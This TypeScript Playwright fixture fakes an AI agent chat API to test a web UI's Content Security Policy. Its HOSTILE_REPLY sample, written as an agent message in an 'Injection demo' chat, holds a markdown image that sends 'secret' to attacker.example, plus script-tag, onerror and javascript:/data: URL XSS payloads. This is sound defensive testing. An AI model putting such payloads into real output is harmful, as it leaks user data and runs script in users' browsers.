import {
    AgentId,
    ChatId,
    createProblem,
    encodeSseMessage,
    ENGINE_API_PREFIX,
    MemberId,
    MessageId,
} from '@ptbk/engine-api';
import type { EngineApiClient, EngineApiResponse, EngineApiStreamItem, ReplyStreamEvent } from '@ptbk/engine-api';
import { createInMemoryEngineApiClient } from '@ptbk/engine-api/in-memory';
import { readFileSync } from 'node:fs';

import type { Page, Route } from '@playwright/test';

/** The agent page the CSP checks visit. */
export const FAKE_AGENT_ID = 'ada';
/** The owner's chat with Ada, whose reply carries the hostile samples (spec, Security hardening 5). */
export const FAKE_CHAT_ID = 'chat-hostile';

/** Every way the spec and M-04's "Injection demo" agent try to make agent output load, run or navigate. */
export const HOSTILE_REPLY = [
    'Here is what I found.',
    '',
    '![x](https://attacker.example/?d=secret)',
    '',
    '<script>alert(1)</script> and <img src=x onerror=alert(1)>',
    '',
    '[click](javascript:alert(1)), [x](data:text/html,<script>alert(1)</script>), [api](/v1/agents/1) and [docs](https://example.com/a)',
    '',
    '```ts',
    'const answer: number = 42; // the answer',
    '```',
    '',
    'overlong'.repeat(80),
].join('\n');

type Call = (
    engineApi: EngineApiClient,
    match: RegExpExecArray,
    query: URLSearchParams,
    body: unknown,
    signal: AbortSignal,
) => Promise<EngineApiResponse<unknown>>;

const agentId = (match: RegExpExecArray) => AgentId.parse(match[1] ?? '');
const chatId = (match: RegExpExecArray) => ChatId.parse(match[1] ?? '');
const messageId = (match: RegExpExecArray) => MessageId.parse(match[2] ?? '');

/** The routes the visited pages call, with the success status the contract gives each; anything else answers 404. */
const ROUTES: readonly (readonly ['GET' | 'POST', RegExp, number, Call])[] = [
    ['GET', /^\/engine$/, 200, (api, _, __, ___, signal) => api.engine.get(signal)],
    ['GET', /^\/me$/, 200, (api, _, __, ___, signal) => api.me.get(signal)],
    ['GET', /^\/agents$/, 200, (api, _, query, __, signal) => api.agents.list(Object.fromEntries(query), signal)],
    ['GET', /^\/agents\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.agents.get(agentId(match), signal)],
    [
        'GET',
        /^\/agents\/([\w-]+)\/status$/,
        200,
        (api, match, _, __, signal) => api.agents.getStatus(agentId(match), signal),
    ],
    [
        'GET',
        /^\/agents\/([\w-]+)\/chats$/,
        200,
        (api, match, query, _, signal) => api.chats.list(agentId(match), Object.fromEntries(query), signal),
    ],
    [
        'POST',
        /^\/agents\/([\w-]+)\/chats$/,
        201,
        (api, match, _, body, signal) => api.chats.create(agentId(match), body as { title?: string }, signal),
    ],
    ['GET', /^\/chats\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.chats.get(chatId(match), signal)],
    [
        'GET',
        /^\/chats\/([\w-]+)\/messages$/,
        200,
        (api, match, query, _, signal) => api.chats.listMessages(chatId(match), Object.fromEntries(query), signal),
    ],
    [
        'POST',
        /^\/chats\/([\w-]+)\/messages$/,
        202,
        (api, match, _, body, signal) => api.chats.sendMessage(chatId(match), body as { content: string }, signal),
    ],
    [
        'POST',
        /^\/chats\/([\w-]+)\/messages\/([\w-]+)\/cancel$/,
        200,
        (api, match, _, __, signal) => api.chats.cancelReply(chatId(match), messageId(match), signal),
    ],
    [
        'GET',
        /^\/members\/([\w-]+)$/,
        200,
        (api, [, id = ''], _, __, signal) => api.members.get(MemberId.parse(id), signal),
    ],
    ['GET', /^\/activity$/, 200, (api, _, query, __, signal) => api.activity.list(Object.fromEntries(query), signal)],
    ['GET', /^\/security$/, 200, (api, _, __, ___, signal) => api.security.get(signal)],
    ['GET', /^\/members$/, 200, (api, _, query, __, signal) => api.members.list(Object.fromEntries(query), signal)],
    ['GET', /^\/secrets$/, 200, (api, _, query, __, signal) => api.secrets.list(Object.fromEntries(query), signal)],
    ['POST', /^\/secrets$/, 201, (api, _, __, body, signal) => api.secrets.create(body as never, signal)],
    [
        'GET',
        /^\/me\/passkeys$/,
        200,
        (api, _, query, __, signal) => api.me.listPasskeys(Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/me\/sessions$/,
        200,
        (api, _, query, __, signal) => api.me.listSessions(Object.fromEntries(query), signal),
    ],
    ['GET', /^\/passkeys$/, 200, (api, _, query, __, signal) => api.passkeys.list(Object.fromEntries(query), signal)],
    ['GET', /^\/runs$/, 200, (api, _, query, __, signal) => api.runs.list(Object.fromEntries(query), signal)],
];

/** Every security panel section filled, with a foreign certificate and a heartbeat in its raw, oddly spaced form. */
export const RAW_HEARTBEAT = '{ "v":1,  "seq" : 7,\n"engineId":"memoryengine234567abcdefgh" }';
/** The version the bundle under test was built as, so the panel sees its loader serving the same one. */
const BUILT_VERSION = (
    JSON.parse(readFileSync(new URL('../../package.json', import.meta.url), 'utf8')) as { version: string }
).version;
const SECURITY_OVERVIEW = {
    engine: { version: '1.4.0', releaseLogIndex: 123456, releaseLogEntryUuid: 'c'.repeat(80) },
    update: { status: 'none', policy: 'auto', pinnedVersion: null, availableVersion: null, eligibleAt: null },
    ui: {
        version: BUILT_VERSION,
        bundleSha256: 'ab'.repeat(32),
        releaseLogIndex: 654321,
        releaseLogEntryUuid: 'd'.repeat(64),
        lastUpdateCheck: {
            at: '2026-10-01T11:00:00.000Z',
            outcome: 'up-to-date',
            version: BUILT_VERSION,
            reason: null,
            revocationReason: null,
        },
    },
    tls: {
        certificateSha256: 'ef'.repeat(32),
        notAfter: '2026-12-01T00:00:00.000Z',
        lastCtCheck: {
            at: '2026-10-01T11:00:00.000Z',
            result: 'unexpected-certificate',
            unexpectedCertificates: [
                {
                    sha256: '99'.repeat(32),
                    issuer: 'CN=Some Other CA, O=Elsewhere',
                    notBefore: '2026-09-01T00:00:00.000Z',
                    notAfter: '2026-12-01T00:00:00.000Z',
                },
            ],
        },
    },
    relays: [
        { hostname: 'relay-a.ptbk.io', status: 'connected', since: '2026-10-01T09:00:00.000Z', lastPingRttMs: 38 },
        { hostname: 'relay-b.ptbk.io', status: 'disconnected', since: '2026-10-01T10:00:00.000Z', lastPingRttMs: null },
    ],
    hostnames: [
        {
            hostname: 'memoryengine234567abcdefgh.ptbk.io',
            kind: 'default',
            certificateStatus: 'valid',
            claimRegistered: null,
        },
        { hostname: 'agents.example.com', kind: 'custom', certificateStatus: 'expiring', claimRegistered: true },
    ],
    lastHeartbeat: { sentAt: '2026-10-01T11:59:00.000Z', body: RAW_HEARTBEAT, signature: `ed25519=${'A'.repeat(86)}` },
    clockSkew: null,
    outboundDestinations: ['https://app.ptbk.io', 'wss://relay-a.ptbk.io', 'https://api.openai.com'],
} as const;

const STREAM = /^\/chats\/([\w-]+)\/messages\/([\w-]+)\/stream$/;

/** The whole reply as one SSE body: the in-memory reply generates as it is read, so reading it ends it. */
async function replyStream(engineApi: EngineApiClient, match: RegExpExecArray, signal: AbortSignal): Promise<string> {
    const response = await engineApi.chats.streamReply(chatId(match), messageId(match), {}, signal);
    if (response.kind === 'problem') return '';
    const events: string[] = [];
    for await (const item of response.data as AsyncIterable<EngineApiStreamItem<ReplyStreamEvent>>) {
        events.push(
            encodeSseMessage({
                event: item.event.type,
                ...(item.id === null ? {} : { id: item.id }),
                data: JSON.stringify(item.event),
            }),
        );
    }
    return events.join('');
}

/**
 * Answers the engine API from the in-memory client until the mock engine (M-04) and the loader (M-05) serve the
 * bundle for real (X-04). Same origin as the bundle, so `connect-src 'self'` still applies.
 */
export async function routeFakeEngineApi(page: Page): Promise<void> {
    const engineApi = createInMemoryEngineApiClient({
        seed: {
            engine: { name: 'CSP test engine', hostname: 'engine.localhost', dashboardUrl: null, mode: 'local' },
            security: SECURITY_OVERVIEW,
            secrets: [
                {
                    id: 'secret-github',
                    name: 'GITHUB_TOKEN',
                    scope: { kind: 'engine' },
                    status: 'active',
                    createdBy: 'member-owner',
                    createdAt: '2026-09-01T00:00:00.000Z',
                    updatedAt: '2026-09-01T00:00:00.000Z',
                    lastUsedAt: '2026-09-30T10:00:00.000Z',
                },
                {
                    id: 'secret-ada',
                    name: 'ADA_SEARCH_KEY',
                    scope: { kind: 'agent', agentId: FAKE_AGENT_ID },
                    status: 'revoked',
                    createdBy: 'member-owner',
                    createdAt: '2026-09-02T00:00:00.000Z',
                    updatedAt: '2026-09-03T00:00:00.000Z',
                    lastUsedAt: null,
                },
            ],
            members: [
                {
                    id: 'member-jana',
                    displayName: 'Jana Nováková',
                    role: 'admin',
                    status: 'active',
                    createdAt: '2026-09-01T00:00:00.000Z',
                    lastSeenAt: null,
                },
            ],
            agents: [
                { id: FAKE_AGENT_ID, source: 'Ada\nPERSONA Research', runState: 'running', visibility: 'public' },
                { id: 'grace', source: 'Grace\nPERSONA Review', createdBy: 'member-jana' },
            ],
            chats: [
                {
                    id: FAKE_CHAT_ID,
                    agentId: FAKE_AGENT_ID,
                    title: 'Injection demo',
                    createdBy: 'member-owner',
                    createdAt: '2026-09-30T10:00:00.000Z',
                    updatedAt: '2026-09-30T10:01:00.000Z',
                },
                {
                    id: 'chat-visitor',
                    agentId: FAKE_AGENT_ID,
                    title: '',
                    createdBy: null,
                    createdAt: '2026-09-29T10:00:00.000Z',
                    updatedAt: '2026-09-29T10:00:00.000Z',
                },
            ],
            messages: [
                message('m-1', FAKE_CHAT_ID, 'user', 'Show me everything you can render.', '2026-09-30T10:00:00.000Z'),
                message('m-2', FAKE_CHAT_ID, 'agent', HOSTILE_REPLY, '2026-09-30T10:01:00.000Z'),
                message('m-3', 'chat-visitor', 'user', 'Do you ship to Brno?', '2026-09-29T10:00:00.000Z', null),
            ],
        },
        // Sent messages get the same hostile reply, streamed in pieces.
        replyScript: () => ({ chunks: HOSTILE_REPLY.match(/[\s\S]{1,40}/g) ?? [] }),
    });
    await page.route(`**${ENGINE_API_PREFIX}/**`, async (route) => {
        const request = route.request();
        const url = new URL(request.url());
        const path = url.pathname.slice(ENGINE_API_PREFIX.length);
        const signal = AbortSignal.timeout(5_000);
        if (path === '/events') {
            // A stream that ends at once: the app reconnects with backoff, and the page still goes network-idle.
            await route.fulfill({ status: 200, contentType: 'text/event-stream', body: '' });
            return;
        }
        const stream = STREAM.exec(path);
        if (request.method() === 'GET' && stream !== null) {
            await route.fulfill({
                status: 200,
                contentType: 'text/event-stream',
                body: await replyStream(engineApi, stream, signal),
            });
            return;
        }
        for (const [method, pattern, status, call] of ROUTES) {
            const match = pattern.exec(path);
            if (request.method() === method && match !== null) {
                const body: unknown = method === 'POST' ? (request.postDataJSON() as unknown) : undefined;
                await fulfil(route, await call(engineApi, match, url.searchParams, body ?? {}, signal), status);
                return;
            }
        }
        await fulfil(route, { kind: 'problem', problem: createProblem('not-found') }, 404);
    });
}

function message(
    id: string,
    chatId: string,
    role: 'user' | 'agent',
    content: string,
    createdAt: string,
    createdBy: string | null = role === 'user' ? 'member-owner' : null,
) {
    return { id, chatId, role, content, status: 'completed' as const, createdBy, createdAt };
}

async function fulfil(route: Route, response: EngineApiResponse<unknown>, status: number): Promise<void> {
    if (response.kind === 'ok') {
        await route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(response.data) });
    } else {
        await route.fulfill({
            status: response.problem.status,
            contentType: 'application/problem+json',
            body: JSON.stringify(response.problem),
        });
    }
}
